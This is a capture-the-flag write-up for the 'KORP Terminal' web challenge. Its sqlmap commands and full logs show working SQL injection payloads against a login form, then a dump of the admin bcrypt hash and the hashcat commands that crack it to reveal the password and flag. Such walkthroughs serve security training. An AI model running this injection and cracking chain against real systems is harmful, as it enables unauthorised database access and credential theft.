# KORP Terminal

# KORP Terminal

### Description

POINTS: 400\

\
DIFFICULTY: very easy

Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

### Solution

![korp-terminal-1](/assets/ctf/htb/korp-terminal-1.png)

Simple login page. If we try error based SQLi injection we are able to get an error.

```json
{
"error": {
    "message": [
        "1064",
        "1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1",
        "42000"
    ],
    "type": "ProgrammingError"
    }
}
```

Simple SQLi payloads didnt work, so I decided to use SQLMap.

* You can get data from Dev Tools or Burpsuite.
* `--ignore-code 401` is required to keep testing, website returns 401 because of failed login.
* `--dbms=MySQL` From error we know that backend is MariaDB (fork of the MySQL)

<details>

<summary>Command: `sqlmap -u http://SERVER:IP --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 --batch`</summary>

```log
└─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:28:37 /2024-03-14/

[19:28:38] [INFO] testing connection to the target URL
[19:28:38] [INFO] testing if the target URL content is stable
[19:28:39] [INFO] target URL content is stable
[19:28:39] [INFO] testing if POST parameter 'username' is dynamic
[19:28:39] [WARNING] POST parameter 'username' does not appear to be dynamic
[19:28:39] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[19:28:39] [INFO] testing for SQL injection on POST parameter 'username'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:28:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:28:39] [WARNING] reflective value(s) found and filtering out
[19:28:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:28:40] [INFO] testing 'Generic inline queries'
[19:28:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:28:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:28:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:28:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:28:56] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --code=401)
[19:28:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:28:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:28:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:28:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:28:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[19:28:57] [WARNING] potential permission problems detected ('command denied')
[19:28:57] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[19:28:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:28:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:28:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:28:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:28:57] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[19:28:57] [INFO] testing 'MySQL inline queries'
[19:28:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:28:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:28:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:28:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:28:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[19:28:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[19:28:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:29:08] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[19:29:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:29:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[19:29:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:29:09] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:29:09] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[19:29:12] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[19:29:14] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[19:29:15] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[19:29:17] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[19:29:19] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[19:29:21] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[19:29:23] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[19:29:26] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[19:29:30] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 376 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=x' RLIKE (SELECT (CASE WHEN (4037=4037) THEN 0x78 ELSE 0x28 END))-- uFPP&password=x

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=x' OR (SELECT 7103 FROM(SELECT COUNT(*),CONCAT(0x716a707171,(SELECT (ELT(7103=7103,1))),0x716a707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YOwk&password=x

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=x' AND (SELECT 3404 FROM (SELECT(SLEEP(5)))OVds)-- Pvwd&password=x
---
[19:29:32] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:29:32] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 118 times, 500 (Internal Server Error) - 268 times
[19:29:32] [INFO] fetched data logged to text files under '/home/woyag/.local/share/sqlmap/output/83.136.249.247'

[*] ending @ 19:29:32 /2024-03-14/
```

</details>

<details>

<summary>`sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 --current-db`</summary>

```log
└─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 --current-db
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.12#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:34:30 /2024-03-14/

[19:34:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=x' RLIKE (SELECT (CASE WHEN (4037=4037) THEN 0x78 ELSE 0x28 END))-- uFPP&password=x

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=x' OR (SELECT 7103 FROM(SELECT COUNT(*),CONCAT(0x716a707171,(SELECT (ELT(7103=7103,1))),0x716a707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YOwk&password=x

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=x' AND (SELECT 3404 FROM (SELECT(SLEEP(5)))OVds)-- Pvwd&password=x
---
[19:34:31] [INFO] testing MySQL
[19:34:31] [INFO] confirming MySQL
[19:34:31] [WARNING] potential permission problems detected ('command denied')
[19:34:31] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:34:31] [INFO] fetching current database
[19:34:31] [INFO] resumed: 'korp_terminal'
current database: 'korp_terminal'
[19:34:31] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 1 times
[19:34:31] [INFO] fetched data logged to text files under '/home/woyag/.local/share/sqlmap/output/83.136.249.247'

[*] ending @ 19:34:31 /2024-03-14/
```

</details>

<details>

<summary>`sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal --tables`</summary>

```log
└─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:34:46 /2024-03-14/

[19:34:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=x' RLIKE (SELECT (CASE WHEN (4037=4037) THEN 0x78 ELSE 0x28 END))-- uFPP&password=x

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=x' OR (SELECT 7103 FROM(SELECT COUNT(*),CONCAT(0x716a707171,(SELECT (ELT(7103=7103,1))),0x716a707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YOwk&password=x

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=x' AND (SELECT 3404 FROM (SELECT(SLEEP(5)))OVds)-- Pvwd&password=x
---
[19:34:47] [INFO] testing MySQL
[19:34:47] [INFO] confirming MySQL
[19:34:47] [WARNING] potential permission problems detected ('command denied')
[19:34:47] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:34:47] [INFO] fetching tables for database: 'korp_terminal'
[19:34:48] [INFO] retrieved: 'users'
Database: korp_terminal
[1 table]
+-------+
| users |
+-------+

[19:34:48] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 3 times
[19:34:48] [INFO] fetched data logged to text files under '/home/woyag/.local/share/sqlmap/output/83.136.249.247'

[*] ending @ 19:34:48 /2024-03-14/
```

</details>

<details>

<summary>`sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal -T users --dump`</summary>

```log
└─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal -T users --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.12#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:36:55 /2024-03-14/

[19:36:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=x' RLIKE (SELECT (CASE WHEN (4037=4037) THEN 0x78 ELSE 0x28 END))-- uFPP&password=x

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=x' OR (SELECT 7103 FROM(SELECT COUNT(*),CONCAT(0x716a707171,(SELECT (ELT(7103=7103,1))),0x716a707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YOwk&password=x

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=x' AND (SELECT 3404 FROM (SELECT(SLEEP(5)))OVds)-- Pvwd&password=x
---
[19:36:56] [INFO] testing MySQL
[19:36:56] [INFO] confirming MySQL
[19:36:57] [WARNING] potential permission problems detected ('command denied')
[19:36:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:36:57] [INFO] fetching columns for table 'users' in database 'korp_terminal'
[19:36:57] [INFO] retrieved: 'id'
[19:36:57] [INFO] retrieved: 'int(11)'
[19:36:58] [INFO] retrieved: 'username'
[19:36:58] [INFO] retrieved: 'varchar(255)'
[19:36:58] [INFO] retrieved: 'password'
[19:36:59] [INFO] retrieved: 'varchar(255)'
[19:36:59] [INFO] fetching entries for table 'users' in database 'korp_terminal'
[19:36:59] [INFO] retrieved: '1'
[19:36:59] [INFO] retrieved: '$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.'
[19:36:59] [INFO] retrieved: 'admin'
Database: korp_terminal
Table: users
[1 entry]
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
+----+--------------------------------------------------------------+----------+

[19:36:59] [INFO] table 'korp_terminal.users' dumped to CSV file '/home/woyag/.local/share/sqlmap/output/83.136.249.247/dump/korp_terminal/users.csv'
[19:36:59] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 13 times
[19:36:59] [INFO] fetched data logged to text files under '/home/woyag/.local/share/sqlmap/output/83.136.249.247'

[*] ending @ 19:36:59 /2024-03-14/
```

</details>

The admin password is hashed, meaning we have to crack it:

1. Identify hash type (probably 3200)

```bash
└─$ hashcat --show admin.hash
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

2. Crack the hash

```bash
└─$ type $rockyou # Variable which stores rockyou location
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

└─$ hashcat -a 0 -m 3200 admin.hash $rockyou

$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv.
Time.Started.....: Mon Mar 11 14:53:41 2024 (3 mins, 39 secs)
Time.Estimated...: Mon Mar 11 14:57:20 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        6 H/s (4.27ms) @ Accel:2 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1384/14344384 (0.01%)
Rejected.........: 0/1384 (0.00%)
Restore.Point....: 1380/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4064-4096
Candidate.Engine.: Device Generator
Candidates.#1....: liberty -> password123
Hardware.Mon.#1..: Util: 96%

Started: Mon Mar 11 14:53:27 2024
```

::: info :information_source:
Password: password123
:::

Login and get flag.

::: tip Flag
`HTB{t3rm1n4l\_cr4ck1ng\_sh3n4nig4n5}`
:::
